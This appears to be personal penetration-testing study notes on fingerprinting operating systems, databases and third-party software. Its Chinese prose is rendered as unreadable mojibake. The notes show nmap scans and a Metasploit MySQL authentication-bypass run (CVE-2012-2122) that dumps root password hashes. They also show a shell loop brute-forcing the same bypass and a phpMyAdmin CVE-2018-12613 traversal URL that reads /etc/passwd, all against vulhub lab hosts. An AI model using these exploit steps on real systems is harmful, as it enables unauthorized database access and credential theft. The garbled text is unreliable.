# ç¬¬äº”å¤©ç³»ç»ŸåŠæ•°æ®åº“

![image42](D:\Note\ç½‘ç»œå®‰å…¨\å›¾ç‰‡\image42.png)

## ä¸€ã€æ“ä½œç³»ç»Ÿå±‚é¢ï¼š

### 1ã€è¯†åˆ«æ“ä½œç³»ç»Ÿå¸¸è§æ–¹æ³•

a. æœ‰ç½‘ç«™

â€‹		å¯ä»¥é€šè¿‡ç½‘ç«™è¯†åˆ«é€šè¿‡ç½‘ç«™çš„æ‰‹å·¥è¯†åˆ«æ–¹æ³•åˆ¤æ–­ï¼š

â€‹		windowså¯¹å¤§å°å†™ä¸æ•æ„Ÿä¹Ÿå°±æ˜¯è¯´ä½ åœ¨ç½‘é¡µä¸­å¯ä»¥æ›¿æ¢ç½‘ç«™è·¯å¾„çš„å¤§å°å†™è¿›è¡Œæµ‹è¯•



b. æ²¡æœ‰ç½‘ç«™

â€‹		é€šè¿‡nmapè¿›è¡Œæ‰«ææ–¹æ³•ï¼šnmap -O IPåœ°å€

~~~ bash
â”€â”€(rootğŸ’€kali)-[~/æ¡Œé¢]
â””â”€# nmap -O 10.1.1.10 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-07 21:06 CST
Nmap scan report for 10.1.1.10 (10.1.1.10)
Host is up (0.0011s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
MAC Address: 00:0C:29:13:E9:61 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
~~~

å¤‡æ³¨ï¼šä¸æ˜¯æ‰€æœ‰çš„ç³»ç»Ÿéƒ½å¯ä»¥ç”¨è¿™ç§æ–¹å¼æ‰«æå‡ºæ“ä½œç³»ç»Ÿçš„ç±»å‹ã€åœ¨windowsçš„ä¸€äº›é«˜ç‰ˆæœ¬ä¸­æ— æ³•æ¢æµ‹ï¼Œä¾‹å¦‚ï¼š

~~~ bash
â”€# nmap -O 10.1.1.129
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-07 21:10 CST
Nmap scan report for 10.1.1.129 (10.1.1.129)
Host is up (0.00053s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE
80/tcp   open  http
MAC Address: 00:0C:29:DC:AF:EA (VMware)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=6/7%OT=80%CT=1%CU=36041%PV=Y%DS=1%DC=D%G=Y%M=000C29%TM
OS:=60BE1ADE%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10C%TI=I%CI=I%II=I%
OS:SS=S%TS=U)OPS(O1=M5B4NW8NNS%O2=M5B4NW8NNS%O3=M5B4NW8%O4=M5B4NW8NNS%O5=M5
OS:B4NW8NNS%O6=M5B4NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)
OS:ECN(R=Y%DF=Y%T=80%W=FFFF%O=M5B4NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%
OS:F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=
OS:80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%
OS:Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=
OS:A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=
OS:Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%
OS:T=80%CD=Z)
~~~



c. TTL

~~~ bash
ä¸åŒçš„æ“ä½œç³»ç»Ÿçš„é»˜è®¤TTLå€¼æ˜¯ä¸åŒçš„ï¼Œ æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡TTLå€¼æ¥åˆ¤æ–­ä¸»æœºçš„æ“ä½œç³»ç»Ÿï¼Œä½†æ˜¯å½“ç”¨æˆ·ä¿®æ”¹äº†TTLå€¼çš„æ—¶å€™ï¼Œå°±ä¼šè¯¯å¯¼æˆ‘ä»¬çš„åˆ¤æ–­ï¼Œæ‰€ä»¥è¿™ç§åˆ¤æ–­æ–¹å¼ä¹Ÿä¸ä¸€å®šå‡†ç¡®ã€‚ä¸‹é¢æ˜¯é»˜è®¤æ“ä½œç³»ç»Ÿçš„TTLï¼š
1ã€WINDOWS NT/2000 Â  TTLï¼š128
2ã€WINDOWS 95/98 Â  Â  TTLï¼š32
3ã€UNIX Â  Â  Â  Â  Â  Â  Â TTLï¼š255
4ã€LINUX Â  Â  Â  Â  Â  Â  TTLï¼š64
5ã€WIN7 Â  Â  Â  Â  		  TTLï¼š64
~~~



d. ç‰¹æ®Šç«¯å£å¦‚(22 / 139 / 445 / 1433 / 3389)



### 2ã€ç®€è¦ä¸¤è€…åŒºåˆ«åŠè¯†åˆ«æ„ä¹‰

~~~ bash
åŒºåˆ«å‡ºä¸åŒçš„æ“ä½œç³»ç»Ÿæ‰èƒ½å¯¹ç—‡ä¸‹è¯ã€å› ä¸ºwindowså’Œlinuxçš„æ¼æ´æ˜¯ä¸ä¸€æ ·çš„ã€å¯èƒ½windowsçš„æ¼æ´åœ¨windowsä¸Šå°±ä¸èƒ½è¿ç”¨ï¼Œ
~~~



### 3ã€æ“ä½œç³»ç»Ÿå±‚é¢æ¼æ´ç±»å‹å¯¹åº”æ„ä¹‰

~~~ bash
ä¸åŒçš„æ¼æ´ä¼šé€ æˆä¸åŒæ¼æ´åˆ©ç”¨çš„æ¡ä»¶
~~~



### 4ã€ç®€è¦æ“ä½œç³»ç»Ÿå±‚é¢æ¼æ´å½±å“èŒƒå›´

~~~ bash
æœ‰äº›æ¼æ´ä¼šå¯¹æ“ä½œç³»ç»Ÿé€ æˆå´©æºƒã€è€Œæœ‰äº›ç³»ç»Ÿåªæ˜¯è“å±ã€æˆ–è€…æ˜¯æƒé™çš„æå‡
~~~



## äºŒã€æ•°æ®åº“å±‚é¢

### 1ã€è¯†åˆ«æ•°æ®åº“ç±»å‹å¸¸è§æ–¹æ³•

é»˜è®¤çš„è¯­è¨€æ­é…çš„æ•°æ®åº“

~~~ bash
ç»„åˆç±»å‹asp + access/mssql
ç»„åˆç±»å‹php + mysql 
ç»„åˆç±»å‹aspx+mssql
ç»„åˆç±»å‹jsp +mysql/oracle
ç»„åˆç±»å‹Python + MongoDB
~~~



å¸¸è§çš„æ•°æ®åº“é»˜è®¤ç«¯å£å·

~~~ bash
å…³ç³»å‹æ•°æ®åº“
  mysql				3306
  sqlserver		1433
  oracle			1521
  psotgresql	5432
éå…³ç³»å‹æ•°æ®åº“
	MongoDB			27017
  Redis				6379
  memcached		11211
~~~



### 2ã€æ•°æ®åº“ç±»å‹åŒºåˆ«åŠè¯†åˆ«æ„ä¹‰

~~~ bash
æ•°æ®åº“çš„ä¸åŒè¡¨ç¤ºçš„ç»“æ„ä¹Ÿæ˜¯ä¸åŒã€å†™æ³•ç»“æ„ä¹Ÿä¸ä¸€æ ·ã€æ‰€ä»¥äº§ç”Ÿçš„æ¼æ´ä¹Ÿä¸ä¸€æ ·ã€‚
ä¸åŒçš„æ•°æ®åº“çš„æ”»å‡»æ–¹å¼ä¹Ÿä¸å®Œå…¨ä¸€æ ·ã€‚
~~~



### 3ã€æ•°æ®åº“å¸¸è§æ¼æ´ç±»å‹åŠæ”»å‡»

~~~ bash
å­˜åœ¨å¼±å£ä»¤
æ•°æ®åº“æ¼æ´
~~~



### 4ã€ç®€è¦æ•°æ®åº“å±‚é¢æ¼æ´å½±å“èŒƒå›´

~~~ bash
æ•°æ®åº“æƒé™
ç½‘ç«™æƒé™
ä¿®æ”¹ç½‘é¡µå†…å®¹
~~~



## ç¬¬ä¸‰æ–¹å±‚é¢

### 1ã€å¦‚ä½•åˆ¤æ–­æœ‰é‚£äº›ç¬¬ä¸‰æ–¹å¹³å°æˆ–è½¯ä»¶

~~~ bash
é€šè¿‡ç½‘ç«™å»æ‰«ææœ‰äº›ç½‘ç«™å®‰è£…äº†ç¬¬ä¸‰æ–¹çš„è½¯ä»¶å¦‚phpmyadminé€šè¿‡æ‰«æå°±å¯ä»¥å‘ç°ä»–çš„å®‰è£…ç›®å½•
åˆ¤æ–­å®‰è£…äº†ç¬¬ä¸‰æ–¹è½¯ä»¶

ç«¯å£æ‰«æ
nmap -O -sV 10.1.1.130
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-08 09:26 CST
Nmap scan report for 10.1.1.130 (10.1.1.130)
Host is up (0.00085s latency).
Not shown: 978 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp   open  telnet      Linux telnetd
25/tcp   open  smtp        Postfix smtpd
80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
111/tcp  open  rpcbind     2 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
512/tcp  open  exec?
513/tcp  open  login?
514/tcp  open  tcpwrapped
1099/tcp open  java-rmi    GNU Classpath grmiregistry
1524/tcp open  bindshell   Metasploitable root shell
2049/tcp open  nfs         2-4 (RPC #100003)
2121/tcp open  ftp         ProFTPD 1.3.1
3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
5900/tcp open  vnc         VNC (protocol 3.3)
6000/tcp open  X11         (access denied)
6667/tcp open  irc         UnrealIRCd
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
~~~



### 2ã€ç®€è¦ä¸ºä»€ä¹ˆè¦è¯†åˆ«ç¬¬ä¸‰æ–¹å¹³å°æˆ–è½¯ä»¶

~~~ bash
ä¸åŒçš„ç¬¬ä¸‰æ–¹è½¯ä»¶æˆ–å·¥å…·å­˜åœ¨ä¸åŒçš„æ¼æ´ã€è¯†åˆ«åˆ°æ›´å¤šçš„ä¿¡æ¯å¯¹æ”¶é›†åˆ°çš„æ¼æ´ä¹Ÿå°±è¶Šå¤š
~~~



### 3ã€å¸¸è§ç¬¬ä¸‰æ–¹å¹³å°æˆ–è½¯ä»¶æ¼æ´ç±»å‹åŠæ”»å‡»

~~~ bash
å¼±å£ä»¤
è½¯ä»¶çš„æ¼æ´æ”»å‡»
~~~



### 4ã€ç®€è¦ç¬¬ä¸‰æ–¹å¹³å°æˆ–è½¯ä»¶å®‰å…¨æµ‹è¯•çš„èŒƒå›´

~~~ bash
ç›´æ¥è·å–åˆ°è½¯ä»¶çš„æƒé™ä¾¿äºè¿›ä¸€æ­¥çš„ææƒå’Œæ”»å‡»
~~~



### 5ã€è¡¥å……

~~~ bash
é™¤å»å¸¸è§„wEBå®‰å…¨åŠAPPå®‰å…¨æµ‹è¯•å¤–ï¼Œç±»ä¼¼æœåŠ¡å™¨å•ä¸€æˆ–å¤æ‚çš„å…¶ä»–æœåŠ¡ï¼ˆé‚®ä»¶ï¼Œæ¸¸æˆï¼Œè´Ÿè½½å‡è¡¡ç­‰ï¼‰ï¼Œä¹Ÿå¯ä»¥ä½œä¸ºå®‰å…¨æµ‹è¯•ç›®æ ‡ï¼Œæ­¤ç±»ç›®æ ‡æµ‹è¯•åŸåˆ™åªæ˜¯å°‘äº†wEBåº”ç”¨æˆ–å…¶ä»–å®‰å…¨é—®é¢˜ã€‚æ‰€ä»¥æ˜ç¡®å®‰å…¨æµ‹è¯•æ€è·¯æ˜¯å¾ˆé‡è¦çš„!
~~~



## å››ã€æ¼”ç¤ºæ¡ˆä¾‹

### 1ã€ä¸Šè¿°æ¶‰åŠçš„åŸºç¡€çŸ¥è¯†



### 2ã€æ¼”ç¤ºæŸæ“ä½œç³»ç»Ÿå±‚é¢æ¼æ´



### 3ã€æ¼”ç¤ºæŸæ•°æ®åº“å¼±å£ä»¤åŠæ¼æ´æ¼”ç¤º

#### æ–¹æ³•ä¸€

##### æ¼æ´æ¢æµ‹

~~~bash
å‚è€ƒæ–‡æ¡£ï¼šhttps://vulhub.org/#/environments/mysql/CVE-2012-2122/

â”Œâ”€â”€(rootğŸ’€kali)-[~]
â””â”€# nmap -O -sV 10.1.1.133
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-08 11:09 CST
Nmap scan report for 10.1.1.133 (10.1.1.133)
Host is up (0.0011s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
3306/tcp open  mysql   MySQL 5.5.23
MAC Address: 00:0C:29:13:E9:61 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.88 seconds
~~~



##### æ¼æ´åˆ©ç”¨

~~~ bash
msf6 auxiliary(scanner/mysql/mysql_hashdump) > use auxiliary/scanner/mysql/mysql_authbypass_hashdump
msf6 auxiliary(scanner/mysql/mysql_authbypass_hashdump) > set rhosts 10.1.1.133
rhosts => 10.1.1.133
msf6 auxiliary(scanner/mysql/mysql_authbypass_hashdump) > set threads 10
threads => 10
msf6 auxiliary(scanner/mysql/mysql_authbypass_hashdump) > run

[+] 10.1.1.133:3306       - 10.1.1.133:3306 The server allows logins, proceeding with bypass test
[*] 10.1.1.133:3306       - 10.1.1.133:3306 Authentication bypass is 10% complete
[*] 10.1.1.133:3306       - 10.1.1.133:3306 Authentication bypass is 20% complete
[*] 10.1.1.133:3306       - 10.1.1.133:3306 Authentication bypass is 30% complete
[*] 10.1.1.133:3306       - 10.1.1.133:3306 Authentication bypass is 40% complete
[*] 10.1.1.133:3306       - 10.1.1.133:3306 Authentication bypass is 50% complete
[*] 10.1.1.133:3306       - 10.1.1.133:3306 Authentication bypass is 60% complete
[*] 10.1.1.133:3306       - 10.1.1.133:3306 Authentication bypass is 70% complete
[*] 10.1.1.133:3306       - 10.1.1.133:3306 Authentication bypass is 80% complete
[+] 10.1.1.133:3306       - 10.1.1.133:3306 Successfully bypassed authentication after 847 attempts. URI: mysql://root:DBrmCST@10.1.1.133:3306
[+] 10.1.1.133:3306       - 10.1.1.133:3306 Successfully exploited the authentication bypass flaw, dumping hashes...
[+] 10.1.1.133:3306       - 10.1.1.133:3306 Saving HashString as Loot: root:*6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9
[+] 10.1.1.133:3306       - 10.1.1.133:3306 Saving HashString as Loot: root:*6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9
[+] 10.1.1.133:3306       - 10.1.1.133:3306 Saving HashString as Loot: root:*6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9
[+] 10.1.1.133:3306       - 10.1.1.133:3306 Saving HashString as Loot: root:*6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9
[+] 10.1.1.133:3306       - 10.1.1.133:3306 Saving HashString as Loot: root:*6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9
[+] 10.1.1.133:3306       - 10.1.1.133:3306 Hash Table has been saved: /root/.msf4/loot/20210608111341_default_10.1.1.133_mysql.hashes_091970.txt
[*] 10.1.1.133:3306       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

md5åœ¨çº¿è§£å¯†
https://www.cmd5.com/
~~~

![image43](D:\Note\ç½‘ç»œå®‰å…¨\å›¾ç‰‡\image43.png)

~~~ bash
â””â”€# mysql -uroot -p123456 -h10.1.1.133
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 886
Server version: 5.5.23 Source distribution

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| test               |
+--------------------+
4 rows in set (0.001 sec)
~~~



#### æ–¹æ³•äºŒ

~~~ bash
â”Œâ”€â”€(rootğŸ’€kali)-[~]
â””â”€# for i in `seq 1 1000`;do mysql -uroot -pwrong -h 10.1.1.133 -P 3306; done                                                                                                      130 â¨¯
ERROR 1045 (28000): Access denied for user 'root'@'10.1.1.128' (using password: YES)
ERROR 1045 (28000): Access denied for user 'root'@'10.1.1.128' (using password: YES)
ERROR 1045 (28000): Access denied for user 'root'@'10.1.1.128' (using password: YES)
ERROR 1045 (28000): Access denied for user 'root'@'10.1.1.128' (using password: YES)
ERROR 1045 (28000): Access denied for user 'root'@'10.1.1.128' (using password: YES)
ERROR 1045 (28000): Access denied for user 'root'@'10.1.1.128' (using password: YES)
ERROR 1045 (28000): Access denied for user 'root'@'10.1.1.128' (using password: YES)
ERROR 1045 (28000): Access denied for user 'root'@'10.1.1.128' (using password: YES)
ERROR 1045 (28000): Access denied for user 'root'@'10.1.1.128' (using password: YES)
ERROR 1045 (28000): Access denied for user 'root'@'10.1.1.128' (using password: YES)
ERROR 1045 (28000): Access denied for user 'root'@'10.1.1.128' (using password: YES)
ERROR 1045 (28000): Access denied for user 'root'@'10.1.1.128' (using password: YES)
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 1553
Server version: 5.5.23 Source distribution

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]>
~~~



### 4ã€æŸç¬¬ä¸‰æ–¹åº”ç”¨å®‰å…¨æ¼æ´æ¼”ç¤º

+ https://vulhub.org/#/environments/phpmyadmin/CVE-2018-12613/

#### ç¯å¢ƒæ­å»º

~~~ bash
[root@hdss7-11 CVE-2018-12613]# pwd
/opt/vulhub/vulhub-master/phpmyadmin/CVE-2018-12613
[root@hdss7-11 CVE-2018-12613]# docker-compose up -d
~~~

![image44](D:\Note\ç½‘ç»œå®‰å…¨\å›¾ç‰‡\image44.png)



#### æ¼æ´åˆ©ç”¨

+ [http://10.1.1.133:8080/?target=db_sql.php%253f/../../../../../../../../etc/passwd](http://10.1.1.133:8080/?target=db_sql.php%3f/../../../../../../../../etc/passwd)

![image45](D:\Note\ç½‘ç»œå®‰å…¨\å›¾ç‰‡\image45.png)